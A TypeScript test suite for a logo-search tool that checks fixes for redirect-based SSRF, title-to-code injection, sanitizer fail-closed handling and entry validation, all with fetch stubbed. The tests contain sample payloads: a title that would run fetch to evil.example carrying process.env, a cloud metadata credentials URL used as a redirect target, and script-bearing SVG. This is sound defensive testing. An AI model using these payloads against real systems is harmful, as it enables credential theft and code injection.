import { describe, it, expect, afterEach } from "bun:test";
import { LogoSearchTool } from "../../tools/logo-search.tool.js";

/**
 * Boundary tests for the logo pipeline — the four defects a review of the R2/R3
 * work found on the edges the first suite did not reach.
 *
 * Each defect is pinned with the payload it was MEASURED with, not a paraphrase:
 *
 * 1. A redirect bypassed the guard entirely. `fetch` defaults to
 *    `redirect: "follow"`, so `checkFetchUrl` judged the URL as WRITTEN while
 *    the request that left the process went somewhere else. Every hop is now
 *    guarded, so these tests assert on the RECORDED CALL LIST — an assertion on
 *    the error message would pass even if the blocked host had been contacted.
 * 2. `logo.title` reached identifier position in the emitted component, which
 *    made a third-party string into source code in the user's project.
 * 3. The sanitizer's fail-closed output (`""`) was reported as a found logo.
 * 4. One unusable entry anywhere in the array failed a query whose consumed
 *    entry was perfectly usable.
 *
 * `fetch` is stubbed throughout; no test here reaches any host.
 */

interface FetchRecord {
  readonly calls: string[];
  restore(): void;
}

const SEARCH_HOST = "https://api.svgl.app";

/** The address the redirect defect delivered a body from. Never requested. */
const METADATA_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

/** The statuses a `Location` is followed from. */
const REDIRECT_STATUSES: ReadonlySet<number> = new Set([301, 302, 303, 307, 308]);

/** How far the stub follows a chain the caller did not ask to handle itself. */
const STUB_FOLLOW_LIMIT = 20;

/**
 * Replaces global fetch with a stub that records every URL it is called with,
 * and that FOLLOWS REDIRECTS unless the caller passed `redirect: "manual"`.
 *
 * Modelling the platform default is what gives these tests their power. A stub
 * that ignores `init` never follows anything, so the redirect defect is
 * invisible to it: the unfixed implementation looks safe purely because the
 * stub declined to do what a real `fetch` does. With the default modelled here,
 * the unfixed implementation records the blocked host in `calls` — measured —
 * and every assertion below is about a request that would really have left.
 */
function installFetch(handler: (url: string) => Response): FetchRecord {
  const original = globalThis.fetch;
  const calls: string[] = [];

  globalThis.fetch = ((input: RequestInfo | URL, init?: RequestInit) => {
    let target = typeof input === "string" ? input : input.toString();

    for (let hop = 0; hop < STUB_FOLLOW_LIMIT; hop++) {
      calls.push(target);
      const response = handler(target);

      if (init?.redirect === "manual") return Promise.resolve(response);

      const location = REDIRECT_STATUSES.has(response.status) ? response.headers.get("location") : null;
      if (location === null || location.length === 0) return Promise.resolve(response);

      target = new URL(location, target).toString();
    }

    return Promise.reject(new Error("stub: too many redirects"));
  }) as unknown as typeof fetch;

  return {
    calls,
    restore() {
      globalThis.fetch = original;
    },
  };
}

function jsonResponse(body: unknown): Response {
  return new Response(JSON.stringify(body), {
    status: 200,
    headers: { "Content-Type": "application/json" },
  });
}

function svgResponse(markup: string): Response {
  return new Response(markup, { status: 200, headers: { "Content-Type": "image/svg+xml" } });
}

/** A real 3xx with a readable `Location`, as Bun returns under `redirect: "manual"`. */
function redirectResponse(location: string): Response {
  return new Response(null, { status: 302, headers: { location } });
}

const BENIGN_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M12 0C5.37 0 0 5.37 0 12z" fill="#181717"/></svg>';

interface CapturedLog {
  readonly level: string;
  readonly text: string;
}

function createLogger(sink: CapturedLog[]) {
  const record = (level: string) => (...args: unknown[]) => {
    sink.push({ level, text: args.map((arg) => (typeof arg === "string" ? arg : JSON.stringify(arg))).join(" ") });
  };
  return {
    debug: record("debug"),
    info: record("info"),
    warn: record("warn"),
    error: record("error"),
    getLevel: () => "debug" as const,
  };
}

interface ToolOutput {
  readonly icons: Array<{ icon: string; code: string }>;
  readonly notFound: Array<{ icon: string; error: string }>;
}

async function run(
  tool: LogoSearchTool,
  queries: string[],
  format: "JSX" | "TSX" | "SVG"
): Promise<ToolOutput> {
  const response = await tool.execute({ queries, format });
  const first = response.content[0];
  expect(first?.type).toBe("text");
  return JSON.parse(first?.text ?? "{}") as ToolOutput;
}

let installed: FetchRecord | null = null;

afterEach(() => {
  installed?.restore();
  installed = null;
});

/** A well-formed search response pointing at a public https route. */
function searchHit(route: unknown = "https://cdn.svgl.app/library/github.svg", title = "GitHub"): unknown {
  return [{ id: 1, title, category: "Software", route, url: "https://svgl.app/github" }];
}

// ---------------------------------------------------------------------------
// 1. Every redirect hop is guarded (R3.1, R3.2, R3.3)
// ---------------------------------------------------------------------------

describe("LogoSearchTool — a redirect is guarded hop by hop (R3.1, R3.2)", () => {
  it("issues no request to a blocked host a guard-approved route redirects to", async () => {
    const logs: CapturedLog[] = [];
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.evil.example/logo.svg"));
      if (url === "https://cdn.evil.example/logo.svg") return redirectResponse(METADATA_URL);
      return new Response("INTERNAL-INSTANCE-CREDENTIALS", { status: 200 });
    });
    const tool = new LogoSearchTool({ logger: createLogger(logs) as never });

    const output = await run(tool, ["github"], "SVG");

    // The call list is the assertion that matters: the body never came back
    // because the request was never issued.
    expect(installed.calls).toEqual([
      "https://api.svgl.app?search=github",
      "https://cdn.evil.example/logo.svg",
    ]);
    expect(installed.calls.some((url) => url.includes("169.254.169.254"))).toBe(false);

    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
    expect(output.notFound[0]?.icon).toBe("github");

    // The refused hop is logged at `warn` with the guard's own reason, exactly
    // as a refused first hop is.
    const warnings = logs.filter((entry) => entry.level === "warn");
    expect(warnings.some((entry) => entry.text.includes("169.254.169.254"))).toBe(true);
  });

  it("guards the SEARCH request's redirects too, not only the SVG request's", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? redirectResponse(METADATA_URL)
        : new Response("INTERNAL-INSTANCE-CREDENTIALS", { status: 200 })
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(installed.calls).toEqual(["https://api.svgl.app?search=github"]);
    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
  });

  it("resolves a RELATIVE Location against the URL that issued it", async () => {
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.svgl.app/library/github.svg"));
      if (url === "https://cdn.svgl.app/library/github.svg") return redirectResponse("/moved/github.svg");
      if (url === "https://cdn.svgl.app/moved/github.svg") return svgResponse(BENIGN_SVG);
      return new Response("unexpected", { status: 404 });
    });
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    // Resolved against the hop that sent it, so the guard sees an absolute URL.
    expect(installed.calls[2]).toBe("https://cdn.svgl.app/moved/github.svg");
    expect(output.icons).toHaveLength(1);
    expect(output.icons[0]?.code).toContain("<svg");
  });

  it("refuses a relative Location that resolves onto a blocked host", async () => {
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.svgl.app/library/github.svg"));
      if (url === "https://cdn.svgl.app/library/github.svg") return redirectResponse("//127.0.0.1/logo.svg");
      return new Response("LOOPBACK", { status: 200 });
    });
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(installed.calls).toHaveLength(2);
    expect(installed.calls.some((url) => url.includes("127.0.0.1"))).toBe(false);
    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
  });

  it("fails the query when the chain exceeds the hop bound, and stops requesting", async () => {
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.svgl.app/hop0.svg"));
      const hop = url.match(/hop(\d+)\.svg$/);
      if (hop !== null) return redirectResponse(`https://cdn.svgl.app/hop${Number(hop[1]) + 1}.svg`);
      return svgResponse(BENIGN_SVG);
    });
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    // One search, then the first request plus the five redirects it may follow.
    expect(installed.calls).toHaveLength(7);
    expect(installed.calls[6]).toBe("https://cdn.svgl.app/hop5.svg");
    expect(installed.calls.some((url) => url.endsWith("hop6.svg"))).toBe(false);
    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
  });

  it("still follows a chain that stays within the bound", async () => {
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.svgl.app/hop1.svg"));
      const hop = url.match(/hop(\d+)\.svg$/);
      if (hop === null) return svgResponse(BENIGN_SVG);
      const next = Number(hop[1]) + 1;
      return redirectResponse(next > 5 ? "https://cdn.svgl.app/final.svg" : `https://cdn.svgl.app/hop${next}.svg`);
    });
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(installed.calls).toHaveLength(7);
    expect(installed.calls[6]).toBe("https://cdn.svgl.app/final.svg");
    expect(output.icons).toHaveLength(1);
  });

  it("keeps a refused redirect's credentials out of the log (R3.3)", async () => {
    const logs: CapturedLog[] = [];
    installed = installFetch((url) => {
      if (url.startsWith(SEARCH_HOST)) return jsonResponse(searchHit("https://cdn.svgl.app/library/github.svg"));
      if (url === "https://cdn.svgl.app/library/github.svg") {
        return redirectResponse("https://admin:s3cr3t-token@127.0.0.1/logo.svg");
      }
      return new Response("LOOPBACK", { status: 200 });
    });
    const tool = new LogoSearchTool({ logger: createLogger(logs) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(installed.calls).toHaveLength(2);
    expect(output.notFound).toHaveLength(1);

    const warnings = logs.filter((entry) => entry.level === "warn");
    expect(warnings.some((entry) => entry.text.includes("127.0.0.1"))).toBe(true);
    for (const entry of logs) {
      expect(entry.text).not.toContain("s3cr3t-token");
      expect(entry.text).not.toContain("admin:");
    }
    expect(output.notFound[0]?.error).not.toContain("s3cr3t-token");
  });
});

// ---------------------------------------------------------------------------
// 2. The title cannot reach identifier position
// ---------------------------------------------------------------------------

/**
 * The payload measured against the unfixed implementation. Interpolated raw, it
 * emitted a module that runs `fetch` on import and reads `process.env`.
 */
const INJECTION_TITLE = 'A: any = fetch("https://evil.example/?c=" + process.env.HOME); const B';

/** A title whose newline leaked its remaining lines into the emitted code. */
const NEWLINE_TITLE = "Evil\nconst LEAK = process.env.HOME";

/** A call expression, and an environment read. Regexes, never evaluation. */
const LIVE_CALL = /\bfetch\s*\(/;
const ENV_READ = /process\s*\.\s*env/;

/** Proves the code parses as TSX. Transpiling never executes it. */
function transpileTsx(code: string): string {
  return new Bun.Transpiler({ loader: "tsx" }).transformSync(code);
}

/** The shape the unfixed implementation emitted, rebuilt to keep the detector honest. */
function unfixedShape(title: string): string {
  return `const ${title}Icon: React.FC = () => (${BENIGN_SVG})`;
}

async function codeForTitle(title: string, format: "JSX" | "TSX"): Promise<string> {
  installed = installFetch((url) =>
    url.startsWith(SEARCH_HOST)
      ? jsonResponse(searchHit("https://cdn.svgl.app/library/github.svg", title))
      : svgResponse(BENIGN_SVG)
  );
  const tool = new LogoSearchTool({ logger: createLogger([]) as never });
  const output = await run(tool, ["github"], format);

  expect(output.notFound).toHaveLength(0);
  expect(output.icons).toHaveLength(1);
  return output.icons[0]?.code ?? "";
}

describe("LogoSearchTool — the logo title never becomes code", () => {
  it("CONTROL: the detector fires on the shape the defect emitted", () => {
    // Non-vacuous by construction: if this stopped matching, every assertion
    // below would pass for the wrong reason.
    const unfixed = unfixedShape(INJECTION_TITLE);
    expect(unfixed).toMatch(LIVE_CALL);
    expect(unfixed).toMatch(ENV_READ);
    // It was valid TypeScript, which is what made it dangerous rather than broken.
    expect(() => transpileTsx(unfixed)).not.toThrow();
    expect(transpileTsx(unfixed)).toMatch(LIVE_CALL);
    // Two declarations from one title: the payload closed the first and opened
    // a second, which is what "interpolated into statement position" means.
    expect(unfixed.match(/\bconst\b/g)).toHaveLength(2);

    // The newline variant leaked its later lines into the emitted file.
    expect(unfixedShape(NEWLINE_TITLE)).toMatch(ENV_READ);
    expect(unfixedShape(NEWLINE_TITLE).split("\n").length).toBeGreaterThan(1);
  });

  for (const format of ["TSX", "JSX"] as const) {
    it(`emits no live call for an injection title in ${format}`, async () => {
      const code = await codeForTitle(INJECTION_TITLE, format);

      expect(code).not.toMatch(LIVE_CALL);
      expect(code).not.toMatch(ENV_READ);
      expect(code).not.toContain("evil.example");

      // One declaration — the component. The payload's own `const B` is gone.
      expect(code.match(/\b(?:const|let|var|function)\b/g)).toHaveLength(1);

      const transpiled = transpileTsx(code);
      expect(transpiled).not.toMatch(LIVE_CALL);
      expect(transpiled).not.toMatch(ENV_READ);

      // The SVG itself is still there — the fix discards the title, not the logo.
      expect(code).toContain("<svg");
      expect(code).toContain('d="M12 0C5.37 0 0 5.37 0 12z"');
    });
  }

  it("emits no extra line and no second declaration for a title carrying a newline", async () => {
    const code = await codeForTitle(NEWLINE_TITLE, "TSX");

    expect(code).not.toMatch(ENV_READ);
    expect(code.split("\n")).toHaveLength(1);
    // The letters of the payload survive INSIDE the identifier — that is the
    // point of the allowlist, and `EvilconstLEAKprocessenvHOME` is one name.
    // What must not survive is a second declaration.
    expect(code.match(/\bconst\b/g)).toHaveLength(1);
    expect(() => transpileTsx(code)).not.toThrow();
  });

  it("derives the component name from an allowlist of identifier characters", async () => {
    const cases: ReadonlyArray<readonly [string, string]> = [
      ["GitHub", "GitHubIcon"],
      ["Adobe Illustrator", "AdobeIllustratorIcon"],
      ["1Password", "PasswordIcon"],
      ["!!! ---", "LogoIcon"],
      ["", "LogoIcon"],
      [INJECTION_TITLE, "AanyfetchhttpsevilexamplecprocessenvHOMEIcon"],
    ];

    for (const [title, expected] of cases) {
      const code = await codeForTitle(title, "TSX");
      installed?.restore();
      installed = null;

      expect(code.startsWith(`const ${expected}: React.FC = () => (`)).toBe(true);
      // Whatever the title was, the identifier is an identifier.
      expect(expected).toMatch(/^[A-Za-z][A-Za-z0-9]*$/);
    }
  });
});

// ---------------------------------------------------------------------------
// 3. Fail-closed sanitizer output is a failed query, not a success
// ---------------------------------------------------------------------------

describe("LogoSearchTool — nothing survived sanitization is a failed query", () => {
  const EMPTIED: ReadonlyArray<readonly [string, string]> = [
    ["the body is empty", ""],
    ["every element is rejected", "<script>x</script>"],
    ["the only element is rejected", "<foreignObject><b>hi</b></foreignObject>"],
    ["there is no markup at all", "not markup, just words"],
  ];

  for (const [description, body] of EMPTIED) {
    for (const format of ["TSX", "SVG"] as const) {
      it(`reports ${format} as failed when ${description}`, async () => {
        installed = installFetch((url) =>
          url.startsWith(SEARCH_HOST) ? jsonResponse(searchHit()) : svgResponse(body)
        );
        const tool = new LogoSearchTool({ logger: createLogger([]) as never });

        const output = await run(tool, ["github"], format);

        expect(output.icons).toHaveLength(0);
        expect(output.notFound).toHaveLength(1);
        expect(output.notFound[0]?.icon).toBe("github");
        // The syntactically broken component the defect emitted is gone with it.
        expect(JSON.stringify(output)).not.toContain("() => ()");
      });
    }
  }

  it("CONTROL: a benign body still succeeds, so the check is not refusing everything", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST) ? jsonResponse(searchHit()) : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "TSX");

    expect(output.notFound).toHaveLength(0);
    expect(output.icons).toHaveLength(1);
    expect(output.icons[0]?.code).toContain("<svg");
  });

  it("keeps a partially sanitized logo, which story.md Assumption 1 delivers silently", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse(searchHit())
        : svgResponse('<svg viewBox="0 0 9 9"><script>alert(1)</script><path d="M0 0h9v9z"/></svg>')
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    // An element survived, so this is a partial removal, not a total loss.
    expect(output.notFound).toHaveLength(0);
    expect(output.icons).toHaveLength(1);
    expect(output.icons[0]?.code).toContain('d="M0 0h9v9z"');
    expect(output.icons[0]?.code).not.toContain("<script");
  });
});

// ---------------------------------------------------------------------------
// 4. Entries are validated individually
// ---------------------------------------------------------------------------

describe("LogoSearchTool — one unusable entry does not fail a usable query", () => {
  it("consumes the usable entry when a later one lacks a field", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse([
            { title: "GitHub", route: "https://cdn.svgl.app/library/github.svg" },
            { title: "GitHub Copilot", route: { light: "https://cdn.svgl.app/library/copilot.svg" } },
          ])
        : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.notFound).toHaveLength(0);
    expect(output.icons).toHaveLength(1);
    expect(installed.calls[1]).toBe("https://cdn.svgl.app/library/github.svg");
  });

  it("accepts a route object carrying only `light`, the one field that is read", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse(searchHit({ light: "https://cdn.svgl.app/library/light-only.svg" }))
        : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.icons).toHaveLength(1);
    expect(installed.calls[1]).toBe("https://cdn.svgl.app/library/light-only.svg");
  });

  it("skips an unusable FIRST entry and consumes the next usable one", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse([
            { id: 1, title: 42, route: "https://cdn.svgl.app/library/broken.svg" },
            { id: 2, title: "GitHub", route: "https://cdn.svgl.app/library/github.svg" },
          ])
        : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.icons).toHaveLength(1);
    expect(installed.calls).toHaveLength(2);
    expect(installed.calls[1]).toBe("https://cdn.svgl.app/library/github.svg");
  });

  it("fails the query when the array holds entries and none is usable", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse([{ id: 1, title: 42 }, { id: 2, route: null }])
        : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
    // Nothing derived from an unreadable body may be fetched (R2.2).
    expect(installed.calls).toHaveLength(1);
  });

  it("still reports an EMPTY array as no logo found, not as an unreadable response", async () => {
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST) ? jsonResponse([]) : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger([]) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.icons).toHaveLength(0);
    expect(output.notFound).toHaveLength(1);
    expect(output.notFound[0]?.error).toContain("No logo found");
    expect(installed.calls).toHaveLength(1);
  });

  it("reports which entry failed, without quoting the body", async () => {
    const logs: CapturedLog[] = [];
    installed = installFetch((url) =>
      url.startsWith(SEARCH_HOST)
        ? jsonResponse([{ id: 1, title: "GitHub", route: { secret: "s3cr3t-token" } }])
        : svgResponse(BENIGN_SVG)
    );
    const tool = new LogoSearchTool({ logger: createLogger(logs) as never });

    const output = await run(tool, ["github"], "SVG");

    expect(output.notFound).toHaveLength(1);
    expect(output.notFound[0]?.error).toContain("0.route");
    expect(output.notFound[0]?.error).not.toContain("s3cr3t-token");
    for (const entry of logs) {
      expect(entry.text).not.toContain("s3cr3t-token");
    }
  });
});
